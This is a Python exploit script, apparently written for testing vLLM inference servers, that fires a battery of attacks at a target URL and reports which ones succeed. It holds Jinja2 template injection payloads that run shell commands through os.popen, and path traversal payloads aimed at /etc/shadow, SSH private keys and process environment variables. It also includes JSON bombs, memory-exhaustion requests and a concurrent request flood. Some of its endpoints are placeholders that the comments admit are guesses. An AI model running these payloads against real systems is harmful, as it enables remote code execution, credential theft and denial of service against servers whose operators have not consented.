#!/usr/bin/env python3
"""
Ultimate vLLM Vulnerability Exploit Suite
包含所有发现的漏洞类型的综合利用脚本
"""

import requests
import json
import base64
import io
import threading
import time
import sys
import argparse
from typing import Dict, Any, List, Optional
import tempfile
import os

class UltimateVLLMExploit:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Ultimate-vLLM-Exploit/3.0'
        })
        
    def test_server_availability(self) -> bool:
        """测试服务器可用性"""
        try:
            response = self.session.get(f"{self.base_url}/v1/models", timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Server availability test failed: {e}")
            return False
    
    def analyze_response(self, response, test_name: str) -> Dict[str, Any]:
        """分析响应，检测漏洞"""
        analysis = {
            'test_name': test_name,
            'status_code': response.status_code,
            'vulnerable': False,
            'vulnerability_type': None,
            'evidence': [],
            'response_size': len(response.text),
            'response_snippet': response.text[:500]
        }
        
        response_lower = response.text.lower()
        
        # 检查各种漏洞指标
        vulnerability_indicators = {
            'assert': ['assertionerror', 'did not output logprobs', 'assert'],
            'template_injection': ['class', 'mro', 'subclasses', 'globals', 'config'],
            'path_traversal': ['no such file', 'permission denied', 'etc/passwd'],
            'json_bomb': ['recursion', 'memory', 'timeout'],
            'deserialization': ['tensor', 'torch', 'unpickle'],
            'information_disclosure': ['traceback', 'file "/', 'line ']
        }
        
        for vuln_type, indicators in vulnerability_indicators.items():
            for indicator in indicators:
                if indicator in response_lower:
                    analysis['vulnerable'] = True
                    analysis['vulnerability_type'] = vuln_type
                    analysis['evidence'].append(indicator)
                    break
            if analysis['vulnerable']:
                break
        
        return analysis
    
    def exploit_assert_vulnerabilities(self) -> List[Dict[str, Any]]:
        """利用assert漏洞"""
        print("[*] Testing assert vulnerabilities...")
        
        results = []
        
        # 1. Logprobs assert攻击
        test_cases = [
            {
                "name": "logprobs_assert_basic",
                "url": f"{self.base_url}/v1/chat/completions",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 0,  # 可能触发assert
                    "temperature": 0.0
                }
            },
            {
                "name": "logprobs_assert_streaming",
                "url": f"{self.base_url}/v1/chat/completions",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "stream": True,
                    "temperature": 0.0
                }
            },
            {
                "name": "max_tokens_assert",
                "url": f"{self.base_url}/v1/completions",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    # 故意不设置max_tokens
                    "temperature": 0.0
                }
            }
        ]
        
        for test_case in test_cases:
            try:
                if test_case["payload"].get("stream"):
                    response = self.session.post(test_case["url"], 
                                               json=test_case["payload"], 
                                               stream=True, timeout=10)
                else:
                    response = self.session.post(test_case["url"], 
                                               json=test_case["payload"], 
                                               timeout=10)
                
                analysis = self.analyze_response(response, test_case["name"])
                results.append(analysis)
                
                if analysis['vulnerable']:
                    print(f"  [!] {test_case['name']}: VULNERABLE ({analysis['vulnerability_type']})")
                else:
                    print(f"  [+] {test_case['name']}: Safe")
                    
            except Exception as e:
                print(f"  [-] {test_case['name']}: Error - {e}")
                results.append({
                    'test_name': test_case['name'],
                    'error': str(e),
                    'vulnerable': False
                })
        
        return results
    
    def exploit_template_injection(self) -> List[Dict[str, Any]]:
        """利用Jinja2模板注入漏洞"""
        print("[*] Testing template injection vulnerabilities...")
        
        results = []
        
        # 各种模板注入负载
        template_payloads = [
            "{{ config }}",
            "{{ self.__init__.__globals__ }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ request.environ }}",
            "{% for item in config.items() %}{{ item }}{% endfor %}",
            "{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'] }}",
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{ joiner.__init__.__globals__.os.popen('whoami').read() }}"
        ]
        
        for i, payload in enumerate(template_payloads):
            try:
                test_name = f"template_injection_{i+1}"
                request_data = {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "test"}],
                    "chat_template": payload
                }
                
                response = self.session.post(f"{self.base_url}/v1/chat/completions", 
                                           json=request_data, timeout=10)
                
                analysis = self.analyze_response(response, test_name)
                results.append(analysis)
                
                if analysis['vulnerable']:
                    print(f"  [!] Template {i+1}: VULNERABLE - {payload[:50]}...")
                    print(f"      Evidence: {analysis['evidence']}")
                else:
                    print(f"  [+] Template {i+1}: Safe")
                    
            except Exception as e:
                print(f"  [-] Template {i+1}: Error - {e}")
                results.append({
                    'test_name': f'template_injection_{i+1}',
                    'error': str(e),
                    'vulnerable': False
                })
        
        return results
    
    def exploit_json_bomb(self) -> List[Dict[str, Any]]:
        """利用JSON炸弹攻击"""
        print("[*] Testing JSON bomb vulnerabilities...")
        
        results = []
        
        json_bomb_tests = [
            {
                "name": "nested_json_bomb",
                "generator": lambda: '{"a":' * 1000 + '1' + '}' * 1000
            },
            {
                "name": "large_array_bomb",
                "generator": lambda: [{"name": f"func_{i}", "description": "A" * 10000} for i in range(100)]
            },
            {
                "name": "deep_object_bomb",
                "generator": lambda: {"level_" + str(i): {"data": "X" * 1000} for i in range(1000)}
            }
        ]
        
        for test in json_bomb_tests:
            try:
                if test["name"] == "nested_json_bomb":
                    # 对于嵌套JSON，我们需要特殊处理
                    payload = {
                        "model": "gpt-3.5-turbo",
                        "messages": [{"role": "user", "content": "test"}],
                        "max_tokens": 1
                    }
                    # 尝试发送恶意JSON字符串
                    json_str = json.dumps(payload).replace('"test"', test["generator"]())
                    response = self.session.post(f"{self.base_url}/v1/chat/completions",
                                               data=json_str,
                                               headers={'Content-Type': 'application/json'},
                                               timeout=10)
                else:
                    payload = {
                        "model": "gpt-3.5-turbo",
                        "messages": [{"role": "user", "content": "test"}],
                        "tools": test["generator"]() if test["name"] == "large_array_bomb" else None,
                        "metadata": test["generator"]() if test["name"] == "deep_object_bomb" else None,
                        "max_tokens": 1
                    }
                    response = self.session.post(f"{self.base_url}/v1/chat/completions",
                                               json=payload, timeout=10)
                
                analysis = self.analyze_response(response, test["name"])
                results.append(analysis)
                
                if analysis['vulnerable']:
                    print(f"  [!] {test['name']}: VULNERABLE")
                else:
                    print(f"  [+] {test['name']}: Safe")
                    
            except Exception as e:
                print(f"  [-] {test['name']}: Error - {e}")
                results.append({
                    'test_name': test['name'],
                    'error': str(e),
                    'vulnerable': 'timeout' in str(e).lower() or 'memory' in str(e).lower()
                })
        
        return results
    
    def exploit_base64_deserialization(self) -> List[Dict[str, Any]]:
        """利用base64反序列化漏洞"""
        print("[*] Testing base64 deserialization vulnerabilities...")
        
        results = []
        
        try:
            # 创建恶意base64负载
            malicious_payloads = [
                {
                    "name": "large_tensor_bomb",
                    "data": self.create_large_tensor_payload()
                },
                {
                    "name": "malformed_tensor",
                    "data": base64.b64encode(b"malformed_tensor_data" * 10000).decode()
                },
                {
                    "name": "empty_tensor",
                    "data": base64.b64encode(b"").decode()
                }
            ]
            
            for payload_info in malicious_payloads:
                try:
                    request_data = {
                        "model": "text-embedding-ada-002",
                        "input": "test",
                        "prompt_embeds": payload_info["data"]
                    }
                    
                    response = self.session.post(f"{self.base_url}/v1/embeddings",
                                               json=request_data, timeout=15)
                    
                    analysis = self.analyze_response(response, payload_info["name"])
                    results.append(analysis)
                    
                    if analysis['vulnerable']:
                        print(f"  [!] {payload_info['name']}: VULNERABLE")
                    else:
                        print(f"  [+] {payload_info['name']}: Safe")
                        
                except Exception as e:
                    print(f"  [-] {payload_info['name']}: Error - {e}")
                    results.append({
                        'test_name': payload_info['name'],
                        'error': str(e),
                        'vulnerable': 'memory' in str(e).lower()
                    })
                    
        except Exception as e:
            print(f"  [-] Base64 deserialization test failed: {e}")
            results.append({
                'test_name': 'base64_deserialization',
                'error': str(e),
                'vulnerable': False
            })
        
        return results
    
    def create_large_tensor_payload(self) -> str:
        """创建大型tensor负载"""
        try:
            import torch
            # 创建一个相对较大的tensor (避免过度消耗内存)
            large_tensor = torch.zeros(1000, 1000)
            
            buffer = io.BytesIO()
            torch.save(large_tensor, buffer)
            buffer.seek(0)
            
            encoded = base64.b64encode(buffer.read()).decode()
            return encoded
        except ImportError:
            # 如果没有torch，创建一个假的大型base64数据
            return base64.b64encode(b"fake_tensor_data" * 100000).decode()
    
    def exploit_path_traversal(self) -> List[Dict[str, Any]]:
        """利用路径遍历漏洞"""
        print("[*] Testing path traversal vulnerabilities...")
        
        results = []
        
        # 路径遍历测试负载
        path_payloads = [
            "../../../etc/passwd",
            "../../../etc/shadow",
            "../../../proc/self/environ",
            "../../../root/.ssh/id_rsa",
            "../../vllm/config.py",
            "../../../var/log/auth.log",
            "file:///etc/passwd",
            "file:///etc/hosts"
        ]
        
        # 尝试通过各种方式触发路径遍历
        for i, path in enumerate(path_payloads):
            try:
                test_name = f"path_traversal_{i+1}"
                
                # 尝试通过不同的参数触发路径遍历
                test_methods = [
                    {
                        "method": "batch_input",
                        "payload": {
                            "input_file": path,
                            "output_file": "/tmp/output.txt"
                        }
                    },
                    {
                        "method": "config_file",
                        "payload": {
                            "config_file": path
                        }
                    }
                ]
                
                for method in test_methods:
                    try:
                        # 这里需要找到实际的端点，目前只是示例
                        response = self.session.post(f"{self.base_url}/v1/batch",
                                                   json=method["payload"], timeout=10)
                        
                        analysis = self.analyze_response(response, f"{test_name}_{method['method']}")
                        results.append(analysis)
                        
                        if analysis['vulnerable']:
                            print(f"  [!] Path {i+1} ({method['method']}): VULNERABLE - {path}")
                        
                    except Exception as e:
                        if "no such file" in str(e).lower() or "permission denied" in str(e).lower():
                            print(f"  [!] Path {i+1}: Potential traversal - {path}")
                            results.append({
                                'test_name': f"{test_name}_{method['method']}",
                                'vulnerable': True,
                                'vulnerability_type': 'path_traversal',
                                'evidence': [str(e)]
                            })
                        
            except Exception as e:
                print(f"  [-] Path traversal test {i+1}: Error - {e}")
        
        return results
    
    def exploit_race_conditions(self) -> List[Dict[str, Any]]:
        """利用竞态条件攻击"""
        print("[*] Testing race condition vulnerabilities...")
        
        results = []
        
        def concurrent_request(thread_id: int, results_list: List):
            """并发请求函数"""
            payload = {
                "model": "gpt-3.5-turbo",
                "messages": [{"role": "user", "content": f"Thread {thread_id}"}],
                "logprobs": True,
                "top_logprobs": 1,
                "max_tokens": 0,
                "stream": True,
                "temperature": 0.0
            }
            
            try:
                response = self.session.post(f"{self.base_url}/v1/chat/completions",
                                           json=payload, stream=True, timeout=10)
                
                analysis = self.analyze_response(response, f"race_condition_thread_{thread_id}")
                results_list.append(analysis)
                
                if analysis['vulnerable']:
                    print(f"    [!] Thread {thread_id}: VULNERABLE")
                
            except Exception as e:
                results_list.append({
                    'test_name': f'race_condition_thread_{thread_id}',
                    'error': str(e),
                    'vulnerable': 'assert' in str(e).lower()
                })
        
        # 启动多个并发线程
        thread_results = []
        threads = []
        
        for i in range(15):
            t = threading.Thread(target=concurrent_request, args=(i, thread_results))
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        results.extend(thread_results)
        
        # 分析结果
        vulnerable_count = sum(1 for r in thread_results if r.get('vulnerable', False))
        print(f"  [*] Race condition results: {vulnerable_count}/{len(thread_results)} threads vulnerable")
        
        return results
    
    def exploit_memory_exhaustion(self) -> List[Dict[str, Any]]:
        """利用内存耗尽攻击"""
        print("[*] Testing memory exhaustion vulnerabilities...")
        
        results = []
        
        memory_attacks = [
            {
                "name": "large_message_content",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "A" * 1000000}],  # 1MB
                    "max_tokens": 1
                }
            },
            {
                "name": "many_messages",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "test"}] * 1000,
                    "max_tokens": 1
                }
            },
            {
                "name": "large_tool_definitions",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "use tools"}],
                    "tools": [
                        {
                            "type": "function",
                            "function": {
                                "name": f"func_{i}",
                                "description": "A" * 10000  # 10KB per tool
                            }
                        } for i in range(100)
                    ],
                    "max_tokens": 1
                }
            }
        ]
        
        for attack in memory_attacks:
            try:
                response = self.session.post(f"{self.base_url}/v1/chat/completions",
                                           json=attack["payload"], timeout=20)
                
                analysis = self.analyze_response(response, attack["name"])
                results.append(analysis)
                
                if analysis['vulnerable']:
                    print(f"  [!] {attack['name']}: VULNERABLE")
                else:
                    print(f"  [+] {attack['name']}: Safe")
                    
            except Exception as e:
                print(f"  [-] {attack['name']}: Error - {e}")
                results.append({
                    'test_name': attack['name'],
                    'error': str(e),
                    'vulnerable': any(keyword in str(e).lower() for keyword in 
                                    ['timeout', 'memory', 'too large', 'limit exceeded'])
                })
        
        return results
    
    def run_comprehensive_exploit(self) -> Dict[str, Any]:
        """运行全面的漏洞利用测试"""
        print("=" * 60)
        print("Ultimate vLLM Vulnerability Exploit Suite")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print()
        
        # 检查服务器可用性
        if not self.test_server_availability():
            print("[-] Server not available, aborting tests")
            return {'error': 'server_not_available'}
        
        print("[+] Server is available, starting comprehensive exploit tests...")
        print()
        
        # 运行所有漏洞利用测试
        all_results = {}
        
        exploit_functions = [
            ('assert_vulnerabilities', self.exploit_assert_vulnerabilities),
            ('template_injection', self.exploit_template_injection),
            ('json_bomb', self.exploit_json_bomb),
            ('base64_deserialization', self.exploit_base64_deserialization),
            ('path_traversal', self.exploit_path_traversal),
            ('race_conditions', self.exploit_race_conditions),
            ('memory_exhaustion', self.exploit_memory_exhaustion),
        ]
        
        for exploit_name, exploit_func in exploit_functions:
            print(f"\n{'='*50}")
            try:
                results = exploit_func()
                all_results[exploit_name] = results
                
                # 统计结果
                vulnerable_count = sum(1 for r in results if r.get('vulnerable', False))
                total_count = len(results)
                
                if vulnerable_count > 0:
                    print(f"[!] {exploit_name}: {vulnerable_count}/{total_count} tests found vulnerabilities!")
                else:
                    print(f"[+] {exploit_name}: No vulnerabilities detected ({total_count} tests)")
                
            except Exception as e:
                print(f"[-] {exploit_name}: Test suite failed with error: {e}")
                all_results[exploit_name] = {'error': str(e)}
            
            time.sleep(1)  # 避免过于频繁的请求
        
        # 生成最终报告
        print(f"\n{'='*60}")
        print("ULTIMATE EXPLOIT SUMMARY:")
        print(f"{'='*60}")
        
        total_vulnerabilities = 0
        total_tests = 0
        
        for exploit_name, results in all_results.items():
            if isinstance(results, list):
                exploit_vulns = sum(1 for r in results if r.get('vulnerable', False))
                exploit_tests = len(results)
                total_vulnerabilities += exploit_vulns
                total_tests += exploit_tests
                
                status = "VULNERABLE" if exploit_vulns > 0 else "Safe"
                print(f"{exploit_name:25} : {status} ({exploit_vulns}/{exploit_tests})")
        
        print(f"\nOverall: {total_vulnerabilities}/{total_tests} tests found vulnerabilities")
        
        if total_vulnerabilities > 0:
            print(f"\n[!] CRITICAL: Found {total_vulnerabilities} vulnerabilities!")
            print("[!] Server is vulnerable to multiple attack vectors!")
            print("[!] Immediate security review and patching required!")
        else:
            print(f"\n[+] Server appears to be well-protected against these attacks.")
            print("[+] No exploitable vulnerabilities found in current configuration.")
        
        return all_results

def main():
    parser = argparse.ArgumentParser(description='Ultimate vLLM Vulnerability Exploit Suite')
    parser.add_argument('url', nargs='?', default='http://localhost:8000',
                        help='Target vLLM server URL (default: http://localhost:8000)')
    parser.add_argument('--timeout', type=int, default=20,
                        help='Request timeout in seconds (default: 20)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose output')
    
    args = parser.parse_args()
    
    # 创建exploit实例
    exploit = UltimateVLLMExploit(args.url)
    
    # 运行全面测试
    results = exploit.run_comprehensive_exploit()
    
    # 返回适当的退出码
    if isinstance(results, dict) and 'error' in results:
        sys.exit(2)  # 服务器不可用
    
    total_vulnerabilities = sum(
        sum(1 for r in test_results if r.get('vulnerable', False))
        for test_name, test_results in results.items()
        if isinstance(test_results, list)
    )
    
    if total_vulnerabilities > 0:
        sys.exit(1)  # 发现漏洞
    else:
        sys.exit(0)  # 未发现漏洞

if __name__ == "__main__":
    main()